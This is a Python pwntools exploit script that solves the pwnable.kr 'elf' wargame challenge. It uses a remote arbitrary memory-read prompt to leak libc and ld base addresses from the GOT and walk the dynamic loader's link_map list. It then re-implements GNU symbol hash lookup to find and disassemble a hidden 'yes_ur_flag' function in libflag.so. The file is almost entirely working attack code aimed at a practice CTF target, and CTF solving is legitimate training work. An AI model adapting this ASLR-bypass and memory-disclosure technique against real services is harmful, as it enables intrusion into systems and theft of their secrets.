#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9024 elf.py
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'elf.py'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 9024)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# shell = ssh("elf", "pwnable.kr", 2222, "guest")
# shell.set_working_directory("/tmp/mytest")
def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    # io = shell.process(["python2.7", "./elf.py"])
    # io.sendlineafter(b"ready", b"")
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# this solution assumes nothing about target except python is not pie.
# 1. leak libc address from got
# 2. leak ld address from libc's got
# 3. walk through ld's dl_ns._ns_loaded (mimic _dl_find_dso_for_object behaviour) until finding libflag.so's link_map (should be the last as it is the last loaded)
# 4. using the map's symbols hash table find the symidx
# 5. using the symidx and symtab, find the symbols offset
# 6. find the mapping base from the link_map
# 7. find the symbol address!

python = ELF("python2.7")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

PROMPT = b"addr?:"
num_reads = 0

def do_read(io: tube, addr: int) -> bytes:
    global num_reads
    num_reads += 1

    debug(f"sending {num_reads} query")

    io.sendlineafter(PROMPT, hex(addr).encode())
    data = io.recvuntil(PROMPT, drop=True)
    io.unrecv(PROMPT)

    return data

def read_ptr(io: tube, addr: int) -> int:
    data = do_read(io, addr)

    return u64(data[:8])

def read_dword(io: tube, addr: int) -> int:
    data = do_read(io, addr)

    return u32(data[:4])

def resolve_base_from_sym(io: tube, imported_in: ELF, lib: ELF, sym: str):
    sym_addr = read_ptr(io, imported_in.got[sym])
    assert (sym_addr & 0xfff) == (lib.sym[sym] & 0xfff)

    lib.address = sym_addr - lib.sym[sym]
    info(f"found {os.path.basename(lib.path)} base! 0x{lib.address:x}")

def _dl_new_hash(s: bytes) -> int:
    h = 5381
    for c in s:
        h = h * 33 + c
    return h & 0xffffffff

def find_libflag_link_map(io: tube) -> int:
    NEXT_PTR_OFFSET = 24

    with log.progress("finding last mapping...") as p:
        dl_ns_ns_loaded = read_ptr(io, ld.sym["_rtld_global"])

        ns_next = dl_ns_ns_loaded

        while ns_next != 0:
            p.status(hex(ns_next))
            
            ns = ns_next
            ns_next = read_ptr(io, ns + NEXT_PTR_OFFSET)

    p.success(hex(ns))

    return ns

def get_libflag_link_map_address(io: tube) -> int:
    libc.address = ld.address = 0

    resolve_base_from_sym(io, python, libc, "malloc")
    resolve_base_from_sym(io, libc, ld, "_dl_find_dso_for_object")

    libflag_link_map_address = find_libflag_link_map(io)
    success(f"found libflag.so link_map! 0x{libflag_link_map_address:x}")

    return libflag_link_map_address

def get_symidx(io, libflag_link_map_address: int) -> int:
    # mimics do_lookup_x
    L_NBUCKETS_OFFSET = 748
    L_GNU_BUCKETS_OFFSET = 768
    L_GNU_CHAIN_ZERO = 776

    l_nbuckets = read_dword(io, libflag_link_map_address + L_NBUCKETS_OFFSET)
    info(f"nbuckets: 0x{l_nbuckets:x}")

    l_gnu_buckets = read_ptr(io, libflag_link_map_address + L_GNU_BUCKETS_OFFSET)
    info(f"l_gnu_buckets: 0x{l_gnu_buckets:x}")

    new_hash = _dl_new_hash(b"yes_ur_flag")
    info(f"newhash: 0x{new_hash:x}")

    bucket = read_dword(io, l_gnu_buckets + 4 * (new_hash % l_nbuckets))
    info(f"bucket: 0x{bucket:x}")

    l_gnu_chain_zero = read_ptr(io, libflag_link_map_address + L_GNU_CHAIN_ZERO)
    info(f"l_gnu_chain_zero: 0x{l_gnu_chain_zero:x}")

    hasharr_address = l_gnu_chain_zero + 4 * bucket
    hasharr = struct.unpack("<IIIIIIII", do_read(io, hasharr_address))
    info(f"hasharr: {[hex(x) for x in hasharr]}")

    for hasharr_entry in hasharr:
        if ((hasharr_entry ^ new_hash) >> 1) == 0:
            return (hasharr_address - l_gnu_chain_zero) // 4

        if (hasharr_entry & 1) != 0:
            break

        hasharr_address += 4
    
    raise Exception("symidx not found!")

def find_function_address_from_symidx(io: tube, libflag_link_map_address: int, symidx: int) -> int:
    L_INFO_OFFSET = 112
    SYMTAB_OFFSET = 8
    symtab = read_ptr(io, read_ptr(io, libflag_link_map_address + L_INFO_OFFSET) + SYMTAB_OFFSET)
    info(f"symtab: 0x{symtab:x}")

    SIZEOF_SYM = 24
    SYM_OFFSET_OFFSET = 8
    sym_offset = read_ptr(io, symtab + SIZEOF_SYM * symidx + SYM_OFFSET_OFFSET)
    success(f"sym offset: 0x{symidx:x}")

    MAP_START_OFFSET = 832
    libflag_base = read_ptr(io, libflag_link_map_address + MAP_START_OFFSET)
    success(f"libflag.so: 0x{libflag_base:x}")

    yes_ur_flag_address = libflag_base + sym_offset
    success(f"yes_ur_flag: 0x{yes_ur_flag_address:x}")

    return yes_ur_flag_address

# first connection - find symidx
num_reads = 0
io = start()

libflag_link_map_address = get_libflag_link_map_address(io)

symidx = get_symidx(io, libflag_link_map_address)
success(f"symidx: 0x{symidx:x}")

# second connection - use symidx to dump yes_ur_flag
num_reads = 0
io = start()

libflag_link_map_address = get_libflag_link_map_address(io)

yes_ur_flag_address = find_function_address_from_symidx(io, libflag_link_map_address, symidx)

yes_ur_flag_contents = do_read(io, yes_ur_flag_address) + do_read(io, yes_ur_flag_address + 32) + do_read(io, yes_ur_flag_address + 64)
success(f"yes_ur_flag (0x{yes_ur_flag_address:x}):\n {disasm(yes_ur_flag_contents)}")
